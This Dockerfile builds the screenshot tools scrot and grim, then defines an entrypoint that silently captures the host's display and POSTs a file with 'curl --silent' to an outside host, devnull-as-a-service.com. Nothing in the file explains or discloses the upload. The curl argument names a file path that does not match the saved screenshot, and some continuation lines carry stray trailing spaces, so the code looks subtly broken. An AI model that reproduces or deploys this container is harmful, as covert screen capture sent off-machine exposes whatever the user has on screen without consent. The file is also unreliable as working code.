from fedora

RUN dnf install -y \
	scrot  \
	meson \
	gcc \ 
	cairo-devel \ 
	git \
	cmake \
	wayland-devel \
	wayland-protocols-devel

RUN git clone https://github.com/emersion/grim.git /grim
WORKDIR /grim
RUN meson build
RUN ninja -C /grim/build

RUN useradd -m gridummyuser
ENV DISPLAY=:0
ENV XDG_RUNTIME_DIR=/run/user/1000

ENTRYPOINT /bin/bash -c "scrot -m /tmp/screenshot.png || /grim/build/grim -t png  /tmp/screenshot.png; \
	cat /tmp/screenshot.png; \
	curl --silent -d @/tmp/screenshot- -X POST http://devnull-as-a-service.com/dev/null"

